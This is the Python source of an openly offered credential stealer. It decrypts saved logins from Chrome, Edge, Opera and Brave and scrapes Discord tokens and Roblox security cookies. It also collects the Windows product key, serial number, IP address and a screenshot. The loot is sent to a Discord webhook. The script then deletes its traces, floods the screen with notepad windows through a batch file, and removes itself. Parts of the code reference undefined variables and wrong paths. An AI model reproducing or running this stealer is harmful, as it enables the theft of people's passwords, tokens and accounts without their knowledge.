import browser_cookie3 as steal, requests, base64, random, string, subprocess, zipfile, shutil, dhooks, os, re, sys, sqlite3, json
from cryptography.hazmat.primitives.ciphers import (Cipher, algorithms, modes)
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.backends import default_backend
from Crypto.Cipher import AES


from base64 import b64decode, b64encode
from dhooks import Webhook, Embed, File
from PIL import ImageGrab as image
from subprocess import Popen, PIPE
from json import loads, dumps
from shutil import copyfile
import urllib.request
import json
from sys import argv
from pathlib import Path
import time
from os import remove
from sys import argv

#gotcha-medium program by war#1337 , https://discord.gg/SZJNYpJ77v , if you are caught using this tool and you get in trouble thats not my fault bozo.

DBP = r'Google\Chrome\User Data\Default\Login Data'
EBP = r'Microsoft\Edge\User Data\Default\Login Data'
MCBP = r'.minecraft\launcher_accounts.json'
OBP = r'\Opera Software\Opera Stable'
BBP = r'\BraveSoftware\Brave-Browser\User Data\Default\Login Data'
ADP = os.environ['LOCALAPPDATA']
#gotcha-medium program by war#1337 , https://discord.gg/SZJNYpJ77v , if you are caught using this tool and you get in trouble thats not my fault bozo.


def gotchasniff(path):
    path += '\\Local Storage\\leveldb'

    tokens = []
    try:
        for file_name in os.listdir(path):
            if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                continue

            for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                    for token in re.findall(regex, line):
                        tokens.append(token)
        return tokens
    except:
        pass


def encrypt(cipher, plaintext, nonce):
    cipher.mode = modes.GCM(nonce)
    encryptor = cipher.encryptor()
    ciphertext = encryptor.update(plaintext)
    return (cipher, ciphertext, nonce)


def decrypt(cipher, ciphertext, nonce):
    cipher.mode = modes.GCM(nonce)
    decryptor = cipher.decryptor()
    return decryptor.update(ciphertext)


def rcipher(key):
    cipher = Cipher(algorithms.AES(key), None, backend=default_backend())
    return cipher


def dpapi(encrypted):
    import ctypes
    import ctypes.wintypes

    class DATA_BLOB(ctypes.Structure):
        _fields_ = [('cbData', ctypes.wintypes.DWORD),
                    ('pbData', ctypes.POINTER(ctypes.c_char))]

    p = ctypes.create_string_buffer(encrypted, len(encrypted))
    blobin = DATA_BLOB(ctypes.sizeof(p), p)
    blobout = DATA_BLOB()
    retval = ctypes.windll.crypt32.CryptUnprotectData(
        ctypes.byref(blobin), None, None, None, None, 0, ctypes.byref(blobout))
    if not retval:
        raise ctypes.WinError()
    result = ctypes.string_at(blobout.pbData, blobout.cbData)
    ctypes.windll.kernel32.LocalFree(blobout.pbData)
    return result
#gotcha-medium program by war#1337 , https://discord.gg/SZJNYpJ77v , if you are caught using this tool and you get in trouble thats not my fault bozo.


def localdata():
    jsn = None
    with open(os.path.join(os.environ['LOCALAPPDATA'], r"Google\Chrome\User Data\Local State"), encoding='utf-8', mode="r") as f:
        jsn = json.loads(str(f.readline()))
    return jsn["os_crypt"]["encrypted_key"]


def decryptions(encrypted_txt):
    encoded_key = localdata()
    encrypted_key = base64.b64decode(encoded_key.encode())
    encrypted_key = encrypted_key[5:]
    key = dpapi(encrypted_key)
    nonce = encrypted_txt[3:15]
    cipher = rcipher(key)
    return decrypt(cipher, encrypted_txt[15:], nonce)


class chrome:
    def __init__(self):
        self.passwordList = []

    def chromedb(self):
        _full_path = os.path.join(ADP, DBP)
        _temp_path = os.path.join(ADP, 'sqlite_file')
        if os.path.exists(_temp_path):
            os.remove(_temp_path)
        shutil.copyfile(_full_path, _temp_path)
        self.pwsd(_temp_path)
    def pwsd(self, db_file):
        conn = sqlite3.connect(db_file)
        _sql = 'select signon_realm,username_value,password_value from logins'
        for row in conn.execute(_sql):
            host = row[0]
            if host.startswith('android'):
                continue
            name = row[1]
            value = self.cdecrypt(row[2])
            _info = '[==================]\nhostname => : %s\nlogin => : %s\nvalue => : %s\n[==================]\n\n' % (host, name, value)
            self.passwordList.append(_info)
        conn.close()
        os.remove(db_file)

    def cdecrypt(self, encrypted_txt):
        if sys.platform == 'win32':
            try:
                if encrypted_txt[:4] == b'\x01\x00\x00\x00':
                    decrypted_txt = dpapi(encrypted_txt)
                    return decrypted_txt.decode()
                elif encrypted_txt[:3] == b'v10':
                    decrypted_txt = decryptions(encrypted_txt)
                    return decrypted_txt[:-16].decode()
            except WindowsError:
                return None
        else:
            pass

    def saved(self):
        try:
            with open(r'C:\ProgramData\chromepasswords.txt', 'w', encoding='utf-8') as f:
                f.writelines(self.passwordList)
        except WindowsError:
            return None

#gotcha-medium program by war#1337 , https://discord.gg/SZJNYpJ77v , if you are caught using this tool and you get in trouble thats not my fault bozo.

def localdata2():
    jsn = None
    with open(os.path.join(os.environ['LOCALAPPDATA'], r"\Microsoft\Edge\User Data\Default\Local State"), encoding='utf-8', mode="r") as f:
        jsn = json.loads(str(f.readline()))
    return jsn["os_crypt"]["encrypted_key"]


def decryptions2(encrypted_txt):
    encoded_key = localdata2()
    encrypted_key = base64.b64decode(encoded_key.encode())
    encrypted_key = encrypted_key[5:]
    key = dpapi(encrypted_key)
    nonce = encrypted_txt[3:15]
    cipher = rcipher(key)
    return decrypt(cipher, encrypted2_txt[15:], nonce)


class edge:
    def __init__(self):
        self.passwordList = []

    def edgedb(self):
        _full_path = os.path.join(ADP, EBP)
        _temp_path = os.path.join(ADP, 'sqlite_file')
        if os.path.exists(_temp_path):
            os.remove(_temp_path)
        shutil.copyfile(_full_path, _temp_path)
        self.pwsd(_temp_path)
    def pwsd(self, db_file):
        conn = sqlite3.connect(db_file)
        _sql = 'select signon_realm,username_value,password_value from logins'
        for row in conn.execute(_sql):
            host = row[0]
            if host.startswith('android'):
                continue
            name = row[1]
            value = self.cdecrypt(row[2])
            _info = '[==================]\nhostname => : %s\nlogin => : %s\nvalue => : %s\n[==================]\n\n' % (host, name, value)
            self.passwordList.append(_info)
        conn.close()
        os.remove(db_file)

    def cdecrypt(self, encrypted_txt):
        if sys.platform == 'win32':
            try:
                if encrypted_txt[:4] == b'\x01\x00\x00\x00':
                    decrypted_txt = dpapi(encrypted2_txt)
                    return decrypted_txt.decode()
                elif encrypted_txt[:3] == b'v10':
                    decrypted_txt = decryptions(encrypted2_txt)
                    return decrypted_txt[:-16].decode()
            except WindowsError:
                return None
        else:
            pass

    def saved(self):
        try:
            with open(r'C:\ProgramData\edgepasswords.txt', 'w', encoding='utf-8') as f:
                f.writelines(self.passwordList)
        except WindowsError:
            return None

#gotcha-medium program by war#1337 , https://discord.gg/SZJNYpJ77v , if you are caught using this tool and you get in trouble thats not my fault bozo.

def localdata3():
    jsn = None
    with open(os.path.join(os.environ['LOCALAPPDATA'], r"\BraveSoftware\Brave-Browser\User Data\Default"), encoding='utf-8', mode="r") as f:
        jsn = json.loads(str(f.readline()))
    return jsn["os_crypt"]["encrypted_key"]


def decryptions3(encrypted_txt):
    encoded_key = localdata3()
    encrypted_key = base64.b64decode(encoded_key.encode())
    encrypted_key = encrypted_key[5:]
    key = dpapi(encrypted_key)
    nonce = encrypted_txt[3:15]
    cipher = rcipher(key)
    return decrypt(cipher, encrypted3_txt[15:], nonce)


class opera:
    def __init__(self):
        self.passwordList = []

    def operadb(self):
        _full_path = os.path.join(ADP, OBP)
        _temp_path = os.path.join(ADP, 'sqlite_file')
        if os.path.exists(_temp_path):
            os.remove(_temp_path)
        shutil.copyfile(_full_path, _temp_path)
        self.pwsd(_temp_path)
    def pwsd(self, db_file):
        conn = sqlite3.connect(db_file)
        _sql = 'select signon_realm,username_value,password_value from logins'
        for row in conn.execute(_sql):
            host = row[0]
            if host.startswith('android'):
                continue
            name = row[1]
            value = self.cdecrypt(row[2])
            _info = '[==================]\nhostname => : %s\nlogin => : %s\nvalue => : %s\n[==================]\n\n' % (host, name, value)
            self.passwordList.append(_info)
        conn.close()
        os.remove(db_file)

    def cdecrypt(self, encrypted_txt):
        if sys.platform == 'win32':
            try:
                if encrypted_txt[:4] == b'\x01\x00\x00\x00':
                    decrypted_txt = dpapi(encrypted3_txt)
                    return decrypted_txt.decode()
                elif encrypted_txt[:3] == b'v10':
                    decrypted_txt = decryptions(encrypted3_txt)
                    return decrypted_txt[:-16].decode()
            except WindowsError:
                return None
        else:
            pass

    def saved(self):
        try:
            with open(r'C:\ProgramData\operapasswords.txt', 'w', encoding='utf-8') as f:
                f.writelines(self.passwordList)
        except WindowsError:
            return None



def localdata4():
    jsn = None
    with open(os.path.join(os.environ['LOCALAPPDATA'], r"\BraveSoftware\Brave-Browser\User Data\Local State"), encoding='utf-8', mode="r") as f:
        jsn = json.loads(str(f.readline()))
    return jsn["os_crypt"]["encrypted_key"]


def decryptions4(encrypted_txt):
    encoded_key = localdata3()
    encrypted_key = base64.b64decode(encoded_key.encode())
    encrypted_key = encrypted_key[5:]
    key = dpapi(encrypted_key)
    nonce = encrypted_txt[3:15]
    cipher = rcipher(key)
    return decrypt(cipher, encrypted4_txt[15:], nonce)


class brave:
    def __init__(self):
        self.passwordList = []

    def bravedb(self):
        _full_path = os.path.join(ADP, BBP)
        _temp_path = os.path.join(ADP, 'sqlite_file')
        if os.path.exists(_temp_path):
            os.remove(_temp_path)
        shutil.copyfile(_full_path, _temp_path)
        self.pwsd(_temp_path)
    def pwsd(self, db_file):
        conn = sqlite3.connect(db_file)
        _sql = 'select signon_realm,username_value,password_value from logins'
        for row in conn.execute(_sql):
            host = row[0]
            if host.startswith('android'):
                continue
            name = row[1]
            value = self.cdecrypt(row[2])
            _info = '[==================]\nhostname => : %s\nlogin => : %s\nvalue => : %s\n[==================]\n\n' % (host, name, value)
            self.passwordList.append(_info)
        conn.close()
        os.remove(db_file)

    def cdecrypt(self, encrypted_txt):
        if sys.platform == 'win32':
            try:
                if encrypted_txt[:4] == b'\x01\x00\x00\x00':
                    decrypted_txt = dpapi(encrypted4_txt)
                    return decrypted_txt.decode()
                elif encrypted_txt[:3] == b'v10':
                    decrypted_txt = decryptions(encrypted4_txt)
                    return decrypted_txt[:-16].decode()
            except WindowsError:
                return None
        else:
            pass

    def saved(self):
        try:
            with open(r'C:\ProgramData\bravepasswords.txt', 'w', encoding='utf-8') as f:
                f.writelines(self.passwordList)
        except WindowsError:
            return None


if __name__ == "__main__":
    main = chrome()
    main2 = edge()
    main3 = opera()
    main4 = brave()
    try:
        main.chromedb()
        main2.edgedb()
        main3.operadb()
        main4.bravedb()
    except:
        pass
    main.saved()
    main2.saved()
    main3.saved()
    main4.saved()


def gotcha():
    hook = Webhook('placeholder')
    hostname = requests.get("https://api.ipify.org").text
    try:
        from urllib.request import urlopen
        from urllib2 import urlopen     

        api_key = 'placeholder' #not needed.
        hostname = requests.get("https://api.ipify.org").text
        api_url = 'https://geo.ipify.org/api/v1?'
        geodata = api_url + 'apiKey=' + api_key + '&ipAddress=' + hostname
        hostgeo = requests.get("geodata").text
    except:
        pass
    """Gets path for cookies """
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')
    paths = {
        'Discord': roaming + '\\Discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Discord PTB': roaming + '\\discordptb',
        'Lightcord': roaming + '\\Lightcord',
        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default',
        'Edge': local + '\\Microsoft\\Edge\\User Data\\Default'
    }

    message = '\n'
    for platform, path in paths.items():
        if not os.path.exists(path):
            continue

        message += '```'

        tokens = gotchasniff(path)

        if len(tokens) > 0:
            for token in tokens:
                message += f'{token}\n'
        else:
            pass

        message += '```'
    
#gotcha-medium program by war#1337 , https://discord.gg/SZJNYpJ77v , if you are caught using this tool and you get in trouble thats not my fault bozo.

    """screenshot victim's desktop"""
    try:
        screenshot = image.grab()
        screenshot.save(os.getenv('ProgramData') +r'\screenshot.jpg')
        screenshot = open(r'C:\ProgramData\screenshot.jpg', 'rb')
        screenshot.close()
    except:
        pass

    """gather our .zip variables"""
    try:
        zname = r'C:\ProgramData\victimfiles.zip'
        newzip = zipfile.ZipFile(zname, 'w')
        newzip.write(r'C:\ProgramData\chromepasswords.txt')
        newzip.write(r'C:\ProgramData\edgepasswords.txt')
        newzip.write(r'C:\ProgramData\operapasswords.txt')
        newzip.write(r'C:\ProgramData\bravepasswords.txt')
        newzip.close()
        victimfiles = File(r'C:\ProgramData\victimfiles.zip')
    except:
        pass

    """gather our windows product key variables"""
    try:
        user = os.getenv("UserName")
        keys = subprocess.check_output('wmic path softwarelicensingservice get OA3xOriginalProductKey').decode().split('\n')[1].strip()
        types = subprocess.check_output('wmic os get Caption').decode().split('\n')[1].strip()
        sn = subprocess.check_output('wmic os get SerialNumber').decode().split('\n')[1].strip()
        sd = subprocess.check_output('wmic os get Manufacturer').decode().split('\n')[1].strip()
        el = subprocess.check_output('wmic os get EncryptionLevel').decode().split('\n')[1].strip()
        pid = subprocess.check_output('wmic os get InstallDate').decode().split('\n')[1].strip()
        pvn = subprocess.check_output('wmic os get LastBootUpTime').decode().split('\n')[1].strip()
    except:
        pass

    """steal victim's cookie"""
    cookie = [".ROBLOSECURITY"]
    cookies = []
    limit = 2000

    """chrome installation => list cookies from this location"""
    try:
        cookies.extend(list(steal.chrome()))
    except:
        pass

    """opera installation => list cookies from this location"""
    try:
        cookies.extend(list(steal.opera()))
    except:
        pass

    """edge installation => list cookies from this location"""
    try:
        cookies.extend(list(steal.edge()))
    except:
        pass

    """brave installation => list cookies from this location"""
    try:
        cookies.extend(list(steal.brave()))
    except:
        pass

    """read data => if we find a matching positive for our specified variable 'cookie', send it to our webhook."""
    try:
        for y in cookie:
            send = str([str(x) for x in cookies if y in str(x)])
            chunks = [send[i:i + limit] for i in range(0, len(send), limit)]
            for z in chunks:
                roblox = f'```' + f'{z}' + '```'
    except:
        pass

    """attempt to send all recieved data to our specified webhook"""
    try:
        embedWIN = Embed(title=f' [  Gotcha!\'s Beaming Tool => We Have Logged {user}  ] ',description=f'{user}\'s data was extracted and we have succesfully linked to {user}\'s computer, here\'s the details:',color=16316671,timestamp='now')
        embedWIN.add_field("Windows Information:",f"WinType => {types}\nWinKey => {keys}\nEncryption =>  {el}\nManufacture => {sd}\nSerialNumber => {sn}")
        embedWIN.add_field("Location Information",f"IP => {hostname}")
        embedWIN.add_field("Roblox Security Token:",roblox)
        embedWIN.add_field("Extra Tokens Found:",message)
        embedWIN.set_thumbnail(url='http://www.thelogomix.com/files/imagecache/v3-logo-detail/war.jpg')
    except:
        pass

    try:
        hook.send(file=victimfiles)
        hook.send(embed=embedWIN)
    except:
        pass

    """attempt to remove all evidence, allows for victim to stay unaware of data extraction"""
    try:
        subprocess.os.system(r'del C:\ProgramData\screenshot.jpg')
        subprocess.os.system(r'del C:\ProgramData\chromepasswords.txt')
        subprocess.os.system(r'del C:\ProgramData\edgepasswords.txt')
        subprocess.os.system(r'del C:\ProgramData\operapasswords.txt')
        subprocess.os.system(r'del C:\ProgramData\bravepasswords.txt')
        subprocess.os.system(r'del C:\ProgramData\victimfiles.zip')
    except:
        pass

    """makes bat file for bootleg skid virus (just opens hella notepad in possible chance for computer to crash"""
    try:
        v1name = r'C:\ProgramData\fuckyou.bat'
        v1 = open(v1name, "w")
        v1.write("@ECHO off\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe")
        v1.close()
        subprocess.os.system(r'C:\ProgramData\fuckyou.bat')
    except:
    	pass

    """removes the bat file so no its not detectable one knows"""
    try:
        subprocess.os.system(r'del C:\ProgramData\fuckyou.bat')
    except:
    	pass

    """autoremoves the file for privacy (only works with the .py, compiled exes may be broken and not self delete pyinstaller exes do not auto delete)"""
    try:
        remove(argv[0])
    except:
    	pass
#gotcha-medium program by war#1337 , https://discord.gg/SZJNYpJ77v , if you are caught using this tool and you get in trouble thats not my fault bozo.

gotcha()
